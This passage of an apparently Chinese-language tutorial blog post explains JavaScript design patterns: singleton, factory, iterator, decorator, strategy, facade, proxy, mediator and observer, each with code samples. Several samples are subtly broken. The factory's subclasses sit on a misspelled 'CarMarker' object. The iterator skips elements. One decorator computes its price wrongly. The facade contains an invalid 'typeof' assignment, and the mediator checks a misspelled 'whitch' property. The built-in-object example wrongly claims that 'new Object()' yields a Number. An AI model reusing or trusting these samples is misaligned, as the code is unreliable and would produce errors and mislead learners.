<p>另一种解决方案也是将构造函数和实例包装在即时函数中。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> Universe;</span><br><span class="line"></span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> instance;</span><br><span class="line"></span><br><span class="line">  Universe = <span class="function"><span class="keyword">function</span> <span class="title">Universe</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (instance) &#123;</span><br><span class="line">      <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">    instance = <span class="keyword">this</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.start_time = <span class="number">0</span>;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;());</span><br></pre></td></tr></table></figure></p>
<h1 id="工厂模式"><a href="#工厂模式" class="headerlink" title="工厂模式"></a>工厂模式</h1><p>设计工厂模式的目的是为了创建对象。它通常在类或者类的静态方法中实现，具有下列目标：</p>
<ol>
<li>当创建相似对象时执行重复操作</li>
<li>在编译时不知道具体类型(类)的情况下，为工厂客户提供一种创建对象的接口。</li>
</ol>
<p>通过工厂方法（或类）创建的对象在设计上都继承了相同的父对象这个思想，它们都是实现专门功能的特定子类。有时候公共父类是一个包含了工厂方法的同一个类。</p>
<p>下面是工厂模式的实现示例<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">CarMaker</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">CarMaker.prototype.drive = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.doors;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">CarMaker.factory = <span class="function"><span class="keyword">function</span> (<span class="params">type</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> constr = type,</span><br><span class="line">      newcar;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> CarMaker[constr] !== <span class="string">'function'</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> &#123;</span><br><span class="line">      name: <span class="string">"Error"</span>,</span><br><span class="line">      message: constr + <span class="string">" not exist"</span></span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> CarMaker[constr].prototype.drive !== <span class="string">'function'</span>) &#123;</span><br><span class="line">    CarMaker[constr].prototype = <span class="keyword">new</span> CarMaker();</span><br><span class="line">  &#125;</span><br><span class="line">  newcar = <span class="keyword">new</span> CarMaker[constr]();</span><br><span class="line">  <span class="keyword">return</span> newcar;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">CarMarker.Compact = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.doors = <span class="number">4</span>;</span><br><span class="line">&#125;;</span><br><span class="line">CarMarker.Convertible = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.doors = <span class="number">2</span>;</span><br><span class="line">&#125;;</span><br><span class="line">CarMarker.SUV = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.doors = <span class="number">24</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<h2 id="内置对象工厂"><a href="#内置对象工厂" class="headerlink" title="内置对象工厂"></a>内置对象工厂</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> o = <span class="keyword">new</span> <span class="built_in">Object</span>(),</span><br><span class="line">    n = <span class="keyword">new</span> <span class="built_in">Object</span>(),</span><br><span class="line">    s = <span class="built_in">Object</span>(<span class="string">'1'</span>),</span><br><span class="line">    b = <span class="built_in">Object</span>(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">o.constructor === <span class="built_in">Object</span>;</span><br><span class="line">n.constructor === <span class="built_in">Number</span>;</span><br><span class="line">s.constructor === <span class="built_in">String</span>;</span><br><span class="line">b.constructor === <span class="built_in">Boolean</span>;</span><br><span class="line"><span class="comment">// 都为true</span></span><br></pre></td></tr></table></figure>
<h1 id="迭代器模式"><a href="#迭代器模式" class="headerlink" title="迭代器模式"></a>迭代器模式</h1><p>在迭代器模式中，通常有一个包含某种数据集合的对象。该数据可能存储在一个复杂数据结构内部，而要提供一种简单的方法能够访问数据结构中每个元素。对象的消费者并不需要知道如何组织数据，所有需要做的就是取出单个数据进行工作。</p>
<p>在迭代器模式中，对象需要提供一个next()方法。依次调用next()必须返回下一个连续的元素。当然，在特定数据结构中，”下一个”所代表的意义是由您来决定的。</p>
<p>示例<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> agg = (<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> index = <span class="number">0</span>,</span><br><span class="line">      data = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>],</span><br><span class="line">      length = data.length;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    next: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">var</span> element;</span><br><span class="line">      <span class="keyword">if</span> (!<span class="keyword">this</span>.hasNext()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      element = data[index];</span><br><span class="line">      index = index + <span class="number">2</span>;</span><br><span class="line">      <span class="keyword">return</span> element;</span><br><span class="line">    &#125;,</span><br><span class="line">    hasNext: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> index &lt; length;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;());</span><br></pre></td></tr></table></figure></p>
<h1 id="装饰者模式"><a href="#装饰者模式" class="headerlink" title="装饰者模式"></a>装饰者模式</h1><p>在装饰者模式中，可以在运行时动态添加附加功能到对象中。装饰者模式的一个比较方便的特征在于其预期行为的可定制和可配置特性。可以从仅具有一些基本功能的普通对象开始，然后从可用装饰资源池中选择需要用于增强普通对象的那些功能，并且按照顺序进行装饰，尤其是当装饰顺序很重要的时候。</p>
<h2 id="通过原型链继承实现"><a href="#通过原型链继承实现" class="headerlink" title="通过原型链继承实现"></a>通过原型链继承实现</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Sale</span>(<span class="params">price</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.price = price || <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line">Sale.prototype.getPrice = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.price;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Sale.decorators = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">Sale.decorators.fedtax = &#123;</span><br><span class="line">  getPrice: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> price = <span class="keyword">this</span>.uber.getPrice();</span><br><span class="line">    price += price * <span class="number">5</span> / <span class="number">100</span>;</span><br><span class="line">    <span class="keyword">return</span> price;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Sale.decorators.quebec = &#123;</span><br><span class="line">  getPrice: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> price = <span class="keyword">this</span>.uber.getPrice();</span><br><span class="line">    price += price * <span class="number">7.5</span> / <span class="number">100</span>;</span><br><span class="line">    <span class="keyword">return</span> price;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Sale.prototype.decorate = <span class="function"><span class="keyword">function</span>(<span class="params">decorator</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> F = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;&#125;,</span><br><span class="line">      overrides = <span class="keyword">this</span>.constructor.decorators[decorator],</span><br><span class="line">      i, newobj;</span><br><span class="line">  F.prototype = <span class="keyword">this</span>;</span><br><span class="line">  newobj = <span class="keyword">new</span> F();</span><br><span class="line">  newobj.uber = F.prototype;</span><br><span class="line">  <span class="keyword">for</span> (i <span class="keyword">in</span> overrides) &#123;</span><br><span class="line">    <span class="keyword">if</span> (overrides.hasOwnProperty(i)) &#123;</span><br><span class="line">      newobj[i] = overrides[i];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> newobj;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试</span></span><br><span class="line"><span class="keyword">var</span> sale = <span class="keyword">new</span> Sale(<span class="number">100</span>);</span><br><span class="line">sale = sale.decorate(<span class="string">'fedtax'</span>);</span><br><span class="line">sale = sale.decorate(<span class="string">'quebec'</span>);</span><br><span class="line">sale.getPrice();</span><br></pre></td></tr></table></figure>
<h2 id="使用列表实现"><a href="#使用列表实现" class="headerlink" title="使用列表实现"></a>使用列表实现</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Sale</span>(<span class="params">price</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.price = (price &gt; <span class="number">0</span>) || <span class="number">100</span>;</span><br><span class="line">  <span class="keyword">this</span>.decorators_list = [];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Sale.decorators = &#123;&#125;;</span><br><span class="line">Sale.decorators.fedtax = &#123;</span><br><span class="line">  getPrice: <span class="function"><span class="keyword">function</span> (<span class="params">price</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> price + price * <span class="number">5</span> / <span class="number">100</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line">Sale.decorators.quebec = &#123;</span><br><span class="line">  getPrice: <span class="function"><span class="keyword">function</span> (<span class="params">price</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> price + price * <span class="number">7.5</span> / <span class="number">100</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Sale.prototype.decorate = <span class="function"><span class="keyword">function</span> (<span class="params">decorator</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.decorators_list.push(decorator);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Sale.prototype.getPrice = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> price = <span class="keyword">this</span>.price,</span><br><span class="line">      i,</span><br><span class="line">      max = <span class="keyword">this</span>.decorators_list.length,</span><br><span class="line">      name;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; max; i += <span class="number">1</span>) &#123;</span><br><span class="line">    name = <span class="keyword">this</span>.decorators_list[i];</span><br><span class="line">    price = Sale.decorators[name].getPrice(price);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> price;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试</span></span><br><span class="line"><span class="keyword">var</span> sale = <span class="keyword">new</span> Sale(<span class="number">100</span>);</span><br><span class="line">sale.decorate(<span class="string">'fedtax'</span>);</span><br><span class="line">sale.decorate(<span class="string">'quebec'</span>);</span><br><span class="line">sale.getPrice();</span><br></pre></td></tr></table></figure>
<h1 id="策略模式"><a href="#策略模式" class="headerlink" title="策略模式"></a>策略模式</h1><p>策略模式支持您在运行时选择算法。代码的客户端可以使用同一个接口来工作，但是它却根据客户正在试图执行任务的上下文，从多个算法中选择用于处理特定任务的算法。</p>
<h2 id="数据验证示例"><a href="#数据验证示例" class="headerlink" title="数据验证示例"></a>数据验证示例</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> validator = &#123;</span><br><span class="line">  types: &#123;&#125;,</span><br><span class="line"></span><br><span class="line">  messages: [],</span><br><span class="line"></span><br><span class="line">  config: &#123;&#125;,</span><br><span class="line"></span><br><span class="line">  validate: <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> i, msg, type, checker, result_ok;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.messages = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i <span class="keyword">in</span> data) &#123;</span><br><span class="line">      <span class="keyword">if</span> (data.hasOwnProperty(i)) &#123;</span><br><span class="line">        type = <span class="keyword">this</span>.config[i];</span><br><span class="line">        checker = <span class="keyword">this</span>.types[type];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!type) &#123;</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!checker) &#123;</span><br><span class="line">          <span class="keyword">throw</span> &#123;</span><br><span class="line">            name: <span class="string">'ValidationError'</span>,</span><br><span class="line">            message: <span class="string">'No handler to validate type '</span> + type,</span><br><span class="line">          &#125;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        result_ok = checker.validate(data[i]);</span><br><span class="line">        <span class="keyword">if</span> (!result_ok) &#123;</span><br><span class="line">          msg = <span class="string">"Invalid value for *"</span> + i + <span class="string">"*, "</span> + checker.instructions;</span><br><span class="line">          <span class="keyword">this</span>.messages.push(msg);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.hasErrors();</span><br><span class="line">  &#125;,</span><br><span class="line">  hasErrors: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.messages.length !== <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">validator.types.isNonEmpty = &#123;</span><br><span class="line">  validate: <span class="function"><span class="keyword">function</span> (<span class="params">value</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> value !== <span class="string">""</span>;</span><br><span class="line">  &#125;,</span><br><span class="line">  instructions: <span class="string">"this value cannot be empty"</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">validator.types.isNumber = &#123;</span><br><span class="line">  validate: <span class="function"><span class="keyword">function</span> (<span class="params">value</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !<span class="built_in">isNaN</span>(value);</span><br><span class="line">  &#125;,</span><br><span class="line">  instructions: <span class="string">"this value can only be a valid number, e.g. 1, 3.14 or 2010"</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试</span></span><br><span class="line"><span class="keyword">var</span> data = &#123;</span><br><span class="line">  first_name: <span class="string">"Super"</span>,</span><br><span class="line">  age: <span class="string">"unknown"</span>,</span><br><span class="line">&#125;;</span><br><span class="line">validator.config = &#123;</span><br><span class="line">  first_name: <span class="string">'isNonEmpty'</span>,</span><br><span class="line">  age: <span class="string">'isNumber'</span>,</span><br><span class="line">&#125;;</span><br><span class="line">validator.validate(data);</span><br><span class="line"><span class="keyword">if</span> (validator.hasErrors()) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(validator.messages.join(<span class="string">"\n"</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="外观模式"><a href="#外观模式" class="headerlink" title="外观模式"></a>外观模式</h1><p>外观模式是一种简单的模式，它为对象提供了一个可供选择的接口。这是一种非常好的设计实践，可保持方法的简洁性并且不会使它们处理过多的工作。如果原来有许多接受多个参数的uber方法，相比而言，按照本实现方法，最终将会创建更多数量的方法。有时候，两个或更多的方法可能普遍的被一起调用。在这样的情况下，创建另一个方法以包装重复的方法调用是非常有意义的。</p>
<p>外观模式非常适合于浏览器脚本处理，据此可将浏览器之间的差异隐藏在外观之后。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> myevent = &#123;</span><br><span class="line">  stop: <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> e.preventDefault === <span class="string">'function'</span>) &#123;</span><br><span class="line">      e.preventDefault();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> e.stopPropagation === <span class="string">'function'</span>) &#123;</span><br><span class="line">      e.stopPropagation();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> e.returnValue === <span class="string">'boolean'</span>) &#123;</span><br><span class="line">      e.returnValue = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> e.cancelBubble === <span class="string">'boolean'</span>) &#123;</span><br><span class="line">      <span class="keyword">typeof</span> e.cancelBubble = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<h1 id="代理模式"><a href="#代理模式" class="headerlink" title="代理模式"></a>代理模式</h1><p>在代理设计模式中，一个对象充当另一个对象的接口。代理介于对象的客户端和对象本身之间，并且对该对象的访问进行保护。</p>
<p>使用这种模式的其中一个例子是我们可以称为延迟初始化的方法，代理接收初始化请求，但是直到该本体对象明确的将被实际使用之前，代理从不会将该请求传递给本体对象。</p>
<h2 id="范例-略"><a href="#范例-略" class="headerlink" title="范例(略)"></a>范例(略)</h2><ol>
<li><p>通过代理合并多个http请求以提高性能</p>
</li>
<li><p>缓存代理</p>
</li>
</ol>
<h1 id="中介者模式"><a href="#中介者模式" class="headerlink" title="中介者模式"></a>中介者模式</h1><p>应用程序，无论其大小，都是由一些单个的对象所组成。所有这些对象需要一种方式来实现相互通信，而这种通信方式在一定程度上不降低可维护性，也不损害那种安全的改变部分应用程序而不会破坏其余部分的能力。随着应用程序的增长，将添加越来越多的对象。然后在代码重构期间，对象将被删除或重新整理。当对象相互知道太多信息并且直接通信（调用对方的方法并改变属性）时，这将导致产生不良的紧耦合问题。</p>
<p>中介者模式缓解了该问题并促进形成松耦合，在这种模式中，独立的对象之间并不直接通信，而是通过mediator对象。当其中一个colleague对象改变状态以后，它将会通知该mediator，而mediator将会把该变化传达到任意其他应该知道此变化的colleague对象。</p>
<h2 id="中介者示例"><a href="#中介者示例" class="headerlink" title="中介者示例"></a>中介者示例</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Player</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.points = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">this</span>.name = name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Player.prototype.play = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.points += <span class="number">1</span>;</span><br><span class="line">  mediator.played();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> scoreboard = &#123;</span><br><span class="line">  element: <span class="built_in">document</span>.getElementById(<span class="string">'results'</span>),</span><br><span class="line"></span><br><span class="line">  update: <span class="function"><span class="keyword">function</span> (<span class="params">score</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> i, msg = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> (i <span class="keyword">in</span> score) &#123;</span><br><span class="line">      <span class="keyword">if</span> (score.hasOwnProperty(i)) &#123;</span><br><span class="line">        msg += i + <span class="string">': '</span> + score[i] + <span class="string">' | '</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">this</span>.element.innerHTML = msg;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> mediator = &#123;</span><br><span class="line">  players: &#123;&#125;,</span><br><span class="line">  setup: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> players = <span class="keyword">this</span>.players;</span><br><span class="line">    players.home = <span class="keyword">new</span> Player(<span class="string">'Home'</span>);</span><br><span class="line">    players.guest = <span class="keyword">new</span> Player(<span class="string">'Guest'</span>);</span><br><span class="line">  &#125;,</span><br><span class="line">  played: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> players = <span class="keyword">this</span>.players,</span><br><span class="line">    score = &#123;</span><br><span class="line">      Home: players.home.points,</span><br><span class="line">      Guest: players.guest.points</span><br><span class="line">    &#125;;</span><br><span class="line">    scoreboard.update(score);</span><br><span class="line">  &#125;,</span><br><span class="line">  keypress: <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">    e = e || <span class="built_in">window</span>.event;</span><br><span class="line">    <span class="keyword">if</span> (e.whitch === <span class="number">49</span>) &#123;</span><br><span class="line">      mediator.players.home.play();</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (e.whitch === <span class="number">48</span>) &#123;</span><br><span class="line">      mediator.players.guest.play();</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 测试</span></span><br><span class="line">mediator.setup();</span><br><span class="line"><span class="built_in">window</span>.onkeypress = mediator.keypress;</span><br><span class="line"></span><br><span class="line">setTimeout(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">window</span>.onkeypress = <span class="literal">null</span>;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'Game over!'</span>);</span><br><span class="line">&#125;, <span class="number">30000</span>);</span><br></pre></td></tr></table></figure>
<h1 id="观察者模式"><a href="#观察者模式" class="headerlink" title="观察者模式"></a>观察者模式</h1><p>观察者模式广泛应用于客户端JavaScript编程中。所有的浏览器事件是该模式的例子。它也叫订阅/发布模式。</p>
<p>设计这种模式背后的主要动机是促进形成松耦合。在这种模式中，并不是一个对象调用另一个对象的方法，而是一个对象订阅另一个对象的特定活动并在状态改变后获得通知。订阅者也称之为观察者，而被观察者的对象称为发布者或者主题。当发生了一个重要的事件时，发布者将会通知(调用)所有订阅者并且可能经常以事件对象的形式传递消息。</p>
<h2 id="示例：杂志订阅"><a href="#示例：杂志订阅" class="headerlink" title="示例：杂志订阅"></a>示例：杂志订阅</h2><p>我们要实现一个功能：发布者paper，每天出版报纸以及月刊杂志，订阅者joe被通知发生的新闻。</p>
<p>下面是通用发布者功能的一个实现示例<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> publisher = &#123;</span><br><span class="line">  subscribers: &#123;</span><br><span class="line">    any: [] <span class="comment">// 事件类型：订阅者(subscribers)</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// 将订阅者添加到subscribers数组</span></span><br><span class="line">  subscribe: <span class="function"><span class="keyword">function</span> (<span class="params">fn, type</span>) </span>&#123;</span><br><span class="line">    type = type || <span class="string">'any'</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="keyword">this</span>.subscribers[type] === <span class="string">'undefined'</span>) &#123;</span><br><span class="line">      <span class="keyword">this</span>.subscribers[type] = [];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">this</span>.subscribers[type].push(fn);</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// 从订阅者数组subscribers中删除订阅者</span></span><br><span class="line">  unsubscribe: <span class="function"><span class="keyword">function</span> (<span class="params">fn, type</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.visitSubscribers(<span class="string">'unsubscribe'</span>, fn, type);</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// 循环遍历subscribers中的每个元素，并且调用他们注册时提供的方法</span></span><br><span class="line">  publish: <span class="function"><span class="keyword">function</span> (<span class="params">publication, type</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.visitSubscribers(<span class="string">'publish'</span>, publication, type);</span><br><span class="line">  &#125;,</span><br><span class="line">  visitSubscribers: <span class="function"><span class="keyword">function</span> (<span class="params">action, arg, type</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> pubtype = type || <span class="string">'any'</span>,</span><br><span class="line">        subscribers = <span class="keyword">this</span>.subscribers[pubtype],</span><br><span class="line">        i,</span><br><span class="line">        max = subscribers.length;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; max; i += <span class="number">1</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (action === <span class="string">'publish'</span>) &#123;</span><br><span class="line">        subscribers[i](arg);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (subscribers[i] === arg) &#123;</span><br><span class="line">          subscribers.splice(i, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>将普通对象转换成发布者对象<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">makePublisher</span>(<span class="params">o</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i <span class="keyword">in</span> publisher) &#123;</span><br><span class="line">    <span class="keyword">if</span> (publisher.hasOwnProperty(i) &amp;&amp; <span class="keyword">typeof</span> publisher[i] === <span class="string">'function'</span>) &#123;</span><br><span class="line">      o[i] = publisher[i];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  o.subscribers = &#123; <span class="attr">any</span>: [] &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>功能实现：</p>
<p>paper对象<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> paper = &#123;</span><br><span class="line">  daily: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.publish(<span class="string">"big news totay"</span>);</span><br><span class="line">  &#125;,</span><br><span class="line">  monthly: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.publish(<span class="string">"interesting analysis"</span>, <span class="string">"monthly"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>将paper构造成一个发布者<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">makePublisher(paper);</span><br></pre></td></tr></table></figure></p>
<p>订阅者对象joe<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> joe = &#123;</span><br><span class="line">  drinkCoffee: <span class="function"><span class="keyword">function</span> (<span class="params">paper</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Just read '</span> + paper);</span><br><span class="line">  &#125;,</span><br><span class="line">  sundayPreNap: <span class="function"><span class="keyword">function</span> (<span class="params">monthly</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'About to fall asleep reading this'</span> + monthly);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>joe向paper订阅<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">paper.subscribe(joe.drinkCoffee);</span><br><span class="line">paper.subscribe(joe.sundayPreNap, <span class="string">'monthly'</span>);</span><br></pre></td></tr></table></figure></p>
<p>触发一些事件<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">paper.daily();</span><br><span class="line">paper.monthly();</span><br></pre></td></tr></table></figure></p>
<p>打印结果<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Just read big news totay</span><br><span class="line">About to fall asleep reading this interesting analysis</span><br></pre></td></tr></table></figure></p>
<p>代码好的部分在于，paper对象没有硬编码joe，joe对象也没有硬编码paper。此外，代码中也没有那些知道一切的中介者对象。参与对象是松耦合的，我们可以向paper添加更多的订阅者而不需要修改这些对象。</p>
<p>让我们将例子更进一步扩展并且让joe成为发布者：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">makePublisher(joe);</span><br><span class="line">joe.tweet = <span class="function"><span class="keyword">function</span> (<span class="params">msg</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.publish(msg);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
